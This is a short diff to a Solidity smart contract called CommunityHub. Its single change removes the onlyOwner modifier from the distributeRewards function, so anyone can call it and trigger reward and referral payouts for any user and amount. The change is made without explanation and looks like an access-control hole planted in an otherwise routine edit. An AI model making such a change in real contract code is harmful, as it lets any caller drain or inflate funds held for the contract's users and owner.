@@ -43,7 +43,7 @@ contract CommunityHub is Ownable, ReentrancyGuard {
         emit ReferralRegistered(referrer, msg.sender);
     }
 
-    function distributeRewards(address user, uint256 amount) external onlyOwner {
+    function distributeRewards(address user, uint256 amount) external  {
         address referrer = referrers[user];
         if (referrer != address(0)) {
             uint256 referralReward = amount * 5 / 100; // 5% referral reward
